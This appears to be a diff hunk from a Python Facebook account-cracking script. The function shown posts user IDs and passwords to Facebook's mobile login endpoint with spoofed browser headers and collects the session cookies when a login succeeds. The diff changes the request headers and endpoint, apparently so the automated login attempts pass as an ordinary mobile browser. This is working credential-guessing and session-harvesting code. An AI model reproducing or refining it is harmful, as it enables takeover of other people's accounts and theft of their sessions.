@@ -236,24 +236,19 @@ def mumitx(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'mbasic.facebook.com',
-    'method':'POST',
-    'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
-    'scheme':'https',
-    'accept': '*/*',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://m.facebook.com',
-    'referer': 'https://mbasic.facebook.com/',
-    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'x-asbd-id': '198387',
-    'x-fb-lsd': 'AVoPmsopEAk',
-    'user-agent': pro}
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
